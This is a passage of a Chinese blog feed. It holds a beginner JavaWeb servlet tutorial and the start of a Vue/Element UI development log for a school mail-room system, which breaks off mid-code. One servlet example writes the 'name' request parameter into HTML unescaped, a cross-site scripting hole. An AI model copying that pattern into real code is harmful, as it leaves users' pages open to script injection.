&lt;artifactId&gt;tomcat7-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;2.2&lt;/version&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br></pre></td></tr></table></figure><p>然后实现servelet接口，记得在service的方法处配置访问路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">package com.Servlet;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;/demo1&quot;)</span><br><span class="line">public class demo1 implements Servlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void init(ServletConfig servletConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public ServletConfig getServletConfig() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">//    servlet 被访问时触发</span><br><span class="line">    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;servlet hello world&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getServletInfo() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后我们进去8080端口下<code>servelet/demo1</code></p><p>访问这个页面我们虽然看不到任何东西，但是我们idea的控制台就会输出<code>servelet hello world</code></p><h2 id="2-生命周期"><a href="#2-生命周期" class="headerlink" title="2.生命周期"></a>2.生命周期</h2><p><img src="https://s2.loli.net/2022/09/04/cqhP5gwxFstI3Nz.png" alt="生命周期.png"></p><p>首先第一个是init，初始化方法</p><p>调用时机是servelet第一次被访问时，调用次数就只有一次</p><p>可以在<code>@webServlet</code>中修改触发时间，如果<code>loadOnStartup = -1</code>（默认值）就是访问时才触发，如果<code>loadOnStartup = 1（正整数）</code>就是服务器开启就触发</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@WebServlet(urlPatterns = &quot;/demo1&quot; ,loadOnStartup = 1)</span><br></pre></td></tr></table></figure><p>还有<code>service</code>周期，就是浏览器每一次访问时调用，调用次数是多次</p><p>然后是<code>destroy</code>方法，在释放资源和服务器关闭的时候，也就是销毁servelet对象的时候触发</p><p>一般是打开控制台使用<code>Ctrl+C</code></p><p>还有一个<code>getServletInfo</code>这个是获取一些版权信息的，一般<code>return null</code></p><p>然后就是<code>getServletConfig</code>用于获取配置对象，配置对象在init方法中作为参数传入，所以我们这里要使用init方法中的局部变量</p><p>于是这样做：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    ServletConfig config;</span><br><span class="line">    @Override</span><br><span class="line">    public void init(ServletConfig servletConfig) throws ServletException &#123;</span><br><span class="line">        //设置了loadOnStartup，服务器开启就传递数据</span><br><span class="line">        //成员变量赋值</span><br><span class="line">        this.config = servletConfig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">//    返回配置对象</span><br><span class="line">    @Override</span><br><span class="line">    public ServletConfig getServletConfig() &#123;</span><br><span class="line">        return this.config;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/09/04/orKT48evUYl6XZO.png" alt="servelet生命周期函数.png"></p><h2 id="3-体系结构"><a href="#3-体系结构" class="headerlink" title="3.体系结构"></a>3.体系结构</h2><p>Serverlet作为接口有很多的实现类，提供更强大的功能</p><p><img src="https://s2.loli.net/2022/09/04/InaLCDdqG4TVtX8.png" alt="servelet体系结构.png"></p><p>我们使用<code>HttpServlet</code>对于我们的get和post请求进行response</p><p>get请求直接就是在url后面跟参数</p><p>post请求则是需要添加到body中，比如使用form表单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class demo2 extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;get ...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;post ...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-URL配置"><a href="#4-URL配置" class="headerlink" title="4.URL配置"></a>4.URL配置</h2><p>首先我们的一个servelet可以配置多个URLpattern使用逗号间隔</p><p><code>@WebServlet(urlPatterns = &quot;/demo1,/demo2&quot; ,loadOnStartup = 1)</code></p><p>还有一些配置规则，我们现在使用的就是精确匹配</p><p>还有三种配置规则实现多url的归一问题</p><p>而且越精确的匹配规则，优先级越高，同时满足目录匹配和精确匹配就使用精确匹配的url</p><p><img src="https://s2.loli.net/2022/09/04/37nhHRgweNsXdko.png" alt="servelet url配置.png"></p><h2 id="5-response和request对象"><a href="#5-response和request对象" class="headerlink" title="5.response和request对象"></a>5.response和request对象</h2><p>在service函数中有两个参数res和resp，分别作为获取请求的对象和设置返回数据的对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;get ...&quot;);</span><br><span class="line">//  获取name参数中的数据</span><br><span class="line">        String name = req.getParameter(&quot;name&quot;);</span><br><span class="line">//  使用response对象</span><br><span class="line">        resp.setHeader(&quot;content-type&quot;,&quot;text/html;charset=utf-8&quot;);</span><br><span class="line">        resp.getWriter().write(&quot;&lt;h1&gt;&quot;+name+&quot;欢迎你! &lt;/h1&gt;&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="5-1-request"><a href="#5-1-request" class="headerlink" title="5.1 request"></a>5.1 request</h3><p>request处理浏览器发给服务器的报文</p><p>获取请求行的数据，有以下几个常用的方法</p><p><img src="https://s2.loli.net/2022/09/04/fPR9nMxGieF1JOh.png" alt="request方法.png"></p><p>还有此处使用的根据参数的名字获取里面的数据的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String name = req.getParameter(&quot;name&quot;);</span><br></pre></td></tr></table></figure><p>还有请求头和请求体</p><p><img src="https://s2.loli.net/2022/09/04/zFvolEhmIegxb2C.png" alt="request可以获取的数据.png"></p><p>请求体代表使用的是post请求</p><p>获取了之后是字符输入流（如果是图片是字节输入流），进行readline</p><p><img src="https://s2.loli.net/2022/09/04/oI9lKJ7MysVk8gh.png" alt="req获取请求体.png"></p><p>获取请求参数时，原本获取的是字符串<code>javaweb = 1&amp;...</code></p><p>get使用：</p><p><code>String getQueryString()</code></p><p>post使用：</p><p><code>BufferedReader getReader()</code></p><p>但是如果我们post和get请求有大量重复的代码，我们就可以在doPost中调用doGet方法，然而这种实现的前提就是要统一请求参数的函数</p><p>在request中我们就使用泛型的Map，键值对的方式，当一个键有多个值的时候就会形成一个<code>String[]</code>数组。</p><p>servelet为我们封装了三个方法获取参数:</p><p><img src="https://s2.loli.net/2022/09/04/aJoEIAzYR62HVCj.png" alt="request获取请求参数.png"></p><p>因为是通用的获取参数的方法，<strong>所以现在就可以在doPost中调用doGet了</strong></p><p>idea中就给我们准备了servelet的模板，点击新建，选择new一个servelet就可以了</p><p>如果有中文乱码问题</p><p>1.post请求</p><p>要先使用<code>req.setCharacterEncoding(&quot;UTF-8&quot;);</code>，设置字符输入流的编码格式</p><p>然后再获取参数</p><p>2.get请求</p><p>get请求的中文编码字符集是utf-8，但是Tomcat的解码字符集是iso，所以为出现乱码</p><p>先编码再解码：</p><p>使用<code>new String(username.getBytes(&quot;ISO-8859-1&quot;),&quot;UTF-8&quot;);</code></p><p>请求转发问题</p><p>当我们得到一个需要在服务器内进行转发的请求时（既需要在服务器内部再发一次请求）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//  请求转发</span><br><span class="line">        req.getRequestDispatcher(&quot;/demo1&quot;).forward(req,resp);</span><br></pre></td></tr></table></figure><p>此时这个请求就被转发到了demo1中又进行一遍处理</p><p>通过这个我们还可以做到共享资源</p><p>在demo2的servelet中设置资源，需要注意这里资源的类型是object</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//  设置资源</span><br><span class="line">//        增加新资源，hello是object类型</span><br><span class="line">        req.setAttribute(&quot;msg&quot;,&quot;hello&quot;);</span><br><span class="line">//  请求转发</span><br><span class="line">        req.getRequestDispatcher(&quot;/demo3&quot;).forward(req,resp);</span><br></pre></td></tr></table></figure><p>转发给demo3，在demo3中获取资源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object message = request.getAttribute(&quot;msg&quot;);</span><br><span class="line">System.out.println(message);</span><br></pre></td></tr></table></figure><p>还可以删除资源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//        删除资源</span><br><span class="line">        req.removeAttribute(&quot;msg&quot;);</span><br></pre></td></tr></table></figure><h3 id="5-2-response对象"><a href="#5-2-response对象" class="headerlink" title="5.2 response对象"></a>5.2 response对象</h3><p><img src="https://s2.loli.net/2022/09/04/1rAOgdpHS2LcsMi.png" alt="response对象方法.png"></p><p>字符输出用于html页面等，字节输出用于图片等字节文件</p><h4 id="1-重定向"><a href="#1-重定向" class="headerlink" title="1.重定向"></a>1.重定向</h4><p>也是转发请求的方式，实现两个资源的跳转</p><p>302的状态码就是代表重定向</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">resp.setStatus(302);</span><br><span class="line">resp.setHeader(&quot;location&quot;,&quot;资源B的路径&quot;);</span><br></pre></td></tr></table></figure><p>还有简化方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resp.sendRedirect(&quot;路径&quot;)</span><br></pre></td></tr></table></figure><p>重定向有点类似于页面跳转，在触发重定向之后会导致页面跳转</p><p>而且会触发两次请求</p><p>而且重定向需要添加虚拟目录</p><p>关于虚拟目录是否需要添加有一个简单的判断标准</p><p>1.如果是在服务器内部使用—forword跳转转发</p><p>​    就不需要虚拟目录</p><p>2.如果是在浏览器中使用—重定向</p><p>​    就需要添加虚拟目录</p><p>我们还可以动态获取虚拟目录</p><p>使用<code>request.getContextPath()</code>就可以动态获取虚拟目录</p><h4 id="2-响应字符字节"><a href="#2-响应字符字节" class="headerlink" title="2.响应字符字节"></a>2.响应字符字节</h4><p>我们使用writer获取写入对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//        设置识别html页面</span><br><span class="line">        response.setHeader(&quot;Content&quot;,&quot;text/html&quot;);</span><br><span class="line">        PrintWriter writer = response.getWriter();</span><br><span class="line">        writer.write(&quot;&lt;h1&gt;abc&lt;/h1&gt;&quot;);</span><br></pre></td></tr></table></figure><p>如果输出html页面有问题就可以加上这段代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//        设置识别html页面</span><br><span class="line">        response.setHeader(&quot;Content&quot;,&quot;text/html&quot;);</span><br></pre></td></tr></table></figure><p>如果出现中文乱码就使用<code>setContentType</code>设置字符集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">        response.setContentType(&quot;text/html;charset=utf-8&quot;);</span><br><span class="line">//        设置识别html页面</span><br><span class="line">//        response.setHeader(&quot;Content&quot;,&quot;text/html&quot;);</span><br><span class="line">        PrintWriter writer = response.getWriter();</span><br><span class="line">        writer.write(&quot;你好&quot;);</span><br><span class="line">        writer.write(&quot;&lt;h1&gt;abc&lt;/h1&gt;&quot;);</span><br></pre></td></tr></table></figure><p>字符流不需要关闭</p><p>响应字节流</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//        设置字节数据</span><br><span class="line"></span><br><span class="line">//        读取文件</span><br><span class="line">        FileInputStream fls = new FileInputStream(&quot;D:\\新建文件夹\\文件\\GitHub\\pic\\ajax\\http请求报文.png&quot;);</span><br><span class="line">//        获取response的输出流</span><br><span class="line">        ServletOutputStream os =response.getOutputStream();</span><br><span class="line">//        完成流的copy</span><br><span class="line">        byte[] buff = new byte[1024];</span><br><span class="line">        int len = 0;</span><br><span class="line">        while((len = fls.read(buff)) != -1)&#123;</span><br><span class="line">            os.write(buff,0,len);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">//        关闭流</span><br><span class="line">        fls.close();</span><br></pre></td></tr></table></figure><p>这样就可以获取图片等资源</p><p>关于字节流的复制</p><p>我们可以使用 <code>commons-io</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.6&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>然后使用<code>IOUtils</code>的<code>copy</code>方法放入输入流和输出流</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IOUtils.copy(fls,os);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>JavaWeb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>学校收发系统开发日志</title>
    <link href="/2022/07/14/%E6%94%B6%E5%8F%91%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97/"/>
    <url>/2022/07/14/%E6%94%B6%E5%8F%91%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97/</url>
    
    <content type="html"><![CDATA[<h1 id="收发系统开发日志"><a href="#收发系统开发日志" class="headerlink" title="收发系统开发日志"></a>收发系统开发日志</h1><p>相信每个学校都有一个收发室，而收发室每天要处理大量的信件和杂志，为了处理这些书信的收发功能，我们开发了收发系统。</p><p>实现：1.对收到书籍的统计    2.对于用户的管理    3.对于分发书籍的管理</p><h2 id="1-用户管理页面"><a href="#1-用户管理页面" class="headerlink" title="1.用户管理页面"></a>1.用户管理页面</h2><p>页面的大致结构是这样：:bow: 主要是实现为用户的改删查</p><p><img src="https://s2.loli.net/2022/07/14/A7dS58YPlZwzckv.png" alt="用户管理页面.png"></p><h3 id="1-1-查询功能"><a href="#1-1-查询功能" class="headerlink" title="1.1 查询功能"></a>1.1 查询功能</h3><p>还有一堆堆样式就不贴过来惹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 筛选框 --&gt;</span><br><span class="line">&lt;div id=&quot;u39&quot; class=&quot;ax_default box_1&quot;&gt;</span><br><span class="line">  &lt;div id=&quot;u39_div&quot;&gt;</span><br><span class="line">    &lt;span id=&quot;u41&quot;&gt;姓&amp;nbsp; 名：&lt;/span&gt;</span><br><span class="line">    &lt;el-input v-model=&quot;name&quot; placeholder=&quot;姓名&quot; id=&quot;u43&quot;&gt;&lt;/el-input&gt;</span><br><span class="line">    &lt;span id=&quot;u102&quot;&gt;学工号：&lt;/span&gt;</span><br><span class="line">    &lt;el-input</span><br><span class="line">      v-model=&quot;sid&quot;</span><br><span class="line">      placeholder=&quot;学 工 号&quot;</span><br><span class="line">      id=&quot;u44&quot;</span><br><span class="line">      style=&quot;width: 200&quot;</span><br><span class="line">    &gt;&lt;/el-input&gt;</span><br><span class="line">    &lt;!-- 添加点击事件 --&gt;</span><br><span class="line">    &lt;el-button type=&quot;primary&quot; round id=&quot;u45&quot; @click=&quot;search&quot;</span><br><span class="line">      &gt;查找&lt;/el-button</span><br><span class="line">    &gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>主要是使用<code>&amp;nbsp;</code>控制了一下空格间距，然后使用了element的input框</p><p>还有就是注意一下<code>el-input</code>的间距问题，因为input框是块级元素，所以的top样式值不同，第二个会比第一个低21px，所以第二个的top值需要比第一个少21px（因为top是相距顶部的距离）</p><p>然后用户页面使用了element的table做了一个可以滚动的用户列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 结果表单，操作页面插入span --&gt;</span><br><span class="line">&lt;el-table :data=&quot;tableData&quot; height=&quot;500&quot; style=&quot;width: 100%&quot; id=&quot;u46&quot; &gt;</span><br><span class="line">&lt;!-- 序号列 --&gt;</span><br><span class="line">  &lt;el-table-column prop=&quot;num&quot; label=&quot;序号&quot; width=&quot;167&quot;&gt;&lt;/el-table-column&gt;</span><br><span class="line">  ......</span><br><span class="line">&lt;/el-table&gt;</span><br></pre></td></tr></table></figure><p>这个部分最关键的还是search函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">search() &#123;</span><br><span class="line">  // console.log(this.name + &quot; &quot; + this.sid);</span><br><span class="line">  //过滤器</span><br><span class="line">  this.tableData = this.subarr.filter((item) =&gt; &#123;</span><br><span class="line">    // 每次搜索重置数组</span><br><span class="line">    // console.log(this.sid);</span><br><span class="line">    if (this.name == &quot;&quot;) &#123;</span><br><span class="line">      console.log(&quot;逻辑1&quot;);</span><br><span class="line">      return item.sid == this.sid;</span><br><span class="line">    &#125; else if (this.sid == &quot;&quot;) &#123;</span><br><span class="line">      console.log(&quot;逻辑2&quot;);</span><br><span class="line">      return item.name == this.name;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      console.log();</span><br><span class="line">      return item.sid == this.sid &amp;&amp; item.name == this.name;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要是对数组的一个过滤，但是过滤并不改变原数组，所以要<code>this.tableData = this.subarr.filter</code></p><p>而这个subarr是tableData的一个副本数组，这个数组放在那里是一个问题（也就是在哪里写<code>this.subarr = this.tableData;</code>）</p><p>计算属性？会导致subarr一直跟着tableData变化（计算属性的扩写形式应该可以实现）</p><p>函数中？每次触发函数都会执行这句话，还是不对</p><p>我们需要的是只触发这个语句一次，以后subarr就不改变了，作为我们数据的副本</p><p>于是我将它放在了钩子中，实现了我们的需求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mounted() &#123;</span><br><span class="line">  this.subarr = this.tableData;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="1-2-编辑功能"><a href="#1-2-编辑功能" class="headerlink" title="1.2  编辑功能"></a>1.2  编辑功能</h3><p>编辑功能其实是实现了<code>el-table</code>的编辑功能</p><p>这里是用插槽解决的，scope有一个属性row（ElementUI文档）,scope.row可以拿到对应行的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 学院列 --&gt;</span><br><span class="line">  &lt;el-table-column prop=&quot;academe&quot; label=&quot;学院&quot; width=&quot;167&quot;&gt;</span><br><span class="line">    &lt;!-- 插槽实现编辑 学院，姓名，学号，联系电话 可以更改 --&gt;</span><br><span class="line">    &lt;template slot-scope=&quot;scope&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;text&quot; v-model=&quot;scope.row.academe&quot; v-show=&quot;scope.row.iseditor&quot; class=&quot;inBtn&quot;/&gt;</span><br><span class="line">      &lt;span v-show=&quot;!scope.row.iseditor&quot;&gt;&#123;&#123; scope.row.academe &#125;&#125;&lt;/span&gt;</span><br><span class="line">    &lt;/template&gt;</span><br><span class="line">  &lt;/el-table-column&gt;</span><br></pre></td></tr></table></figure><p>在列中加入了一个input框，动态绑定input框中的数据实现保存</p><p>而这个input框靠v-show控制，<code>scope.row.iseditor</code>作为表格元素的属性放入</p><p>而这个span则是起到了显示更改后数据的作用，点击保存了之后显示的就是span，如果去掉span那么就什么都不会显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//data</span><br><span class="line">&#123;</span><br><span class="line">   num: &quot;1&quot;,</span><br><span class="line">   academe: &quot;计算机科学学院&quot;,</span><br><span class="line">   account: &quot;123456789012&quot;,</span><br><span class="line">   pwd: &quot;**********&quot;,</span><br><span class="line">   name: &quot;葉良辰&quot;,</span><br><span class="line">   sid: &quot;123456789012&quot;,</span><br><span class="line">   phone: &quot;18181947511&quot;,</span><br><span class="line">   iseditor: false,</span><br><span class="line"> &#125;,</span><br></pre></td></tr></table></figure><p>然后就是保存按钮</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-table-column prop=&quot;oprate&quot; label=&quot;操作&quot; width=&quot;240&quot;&gt;</span><br><span class="line">  &lt;!-- scope类似一个当前行的定位 --&gt;</span><br><span class="line">  &lt;template slot-scope=&quot;scope&quot;&gt;</span><br><span class="line">    &lt;!-- 点击事件 --&gt;</span><br><span class="line">    &lt;button class=&quot;opbtn&quot; @click=&quot;edit(scope.row, scope)&quot;&gt;&#123;&#123;scope.row.iseditor ? &quot;保存&quot;:&quot;编辑&quot;&#125;&#125;&lt;/button&gt;</span><br><span class="line">    &lt;!-- 点击事件-待定 --&gt;</span><br><span class="line">    &lt;button class=&quot;opbtn&quot; @click=&quot;reset&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;重置密码&lt;/button&gt;</span><br><span class="line">    &lt;!-- 点击事件 --&gt;</span><br><span class="line">    &lt;button class=&quot;opbtn&quot; @click=&quot;del(scope.row)&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;删除&lt;/button&gt;</span><br><span class="line">  &lt;/template&gt;</span><br><span class="line">&lt;/el-table-column&gt;</span><br></pre></td></tr></table></figure><p>保存按钮使用三元表达式判断是保存还是编辑，判断的依据就是<code>iseditor</code>，所以我们click方法中也需要改变<code>iseditor</code>的值</p><h3 id="1-3-删除功能"><a href="#1-3-删除功能" class="headerlink" title="1.3 删除功能"></a>1.3 删除功能</h3><p>删除其实也是一个数组的过滤，只是这个过滤要改变原数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">del(row) &#123;</span><br><span class="line">  let isdel = confirm(&quot;是否确认删除该用户？&quot;);</span><br><span class="line">  if(isdel)&#123;</span><br><span class="line">    console.log(row);</span><br><span class="line">    this.tableData = this.tableData.filter((item) =&gt; &#123;</span><br><span class="line">      return item.sid!=row.sid</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><code>sid</code>是学号，作为唯一标识符，主键，所以可以依靠<code>sid</code>判断删除</p><h2 id="2-仓库管理页面"><a href="#2-仓库管理页面" class="headerlink" title="2.仓库管理页面"></a>2.仓库管理页面</h2><p>仓库管理页面与用户管理页面类似</p><p><img src="https://s2.loli.net/2022/07/31/MBSXZ8damDrPWsu.png" alt="仓库管理页面.png"></p><p>主要是筛选条件更多，取件状态的编辑是一个select框</p><h3 id="2-1查询功能"><a href="#2-1查询功能" class="headerlink" title="2.1查询功能"></a>2.1查询功能</h3><p>首先还是需要一个副本数组，还是叫<code>subarr</code></p><p>这个的查询功能涉及到多条件的查询，而且空查询需要返回全部数据</p><p>所以第一件事是封装一个数组，然后我使用的是数组的<code>foreach</code>方法遍历数据</p><p><code>num == 0 &amp;&amp; item != &quot;&quot;</code>代表该条件是name而且不为空</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">search() &#123;</span><br><span class="line">  this.bookData = this.subarr;</span><br><span class="line">  // console.log(this.name + &quot; &quot; + this.sid);</span><br><span class="line">  //过滤器数组</span><br><span class="line">  let filarr = [this.name, this.bookName, this.period, this.statment];</span><br><span class="line">  // 过滤，过滤条件为空则返回全部数据</span><br><span class="line">  filarr.forEach((item, num) =&gt; &#123;</span><br><span class="line">    if (num == 0 &amp;&amp; item != &quot;&quot;) &#123;</span><br><span class="line">      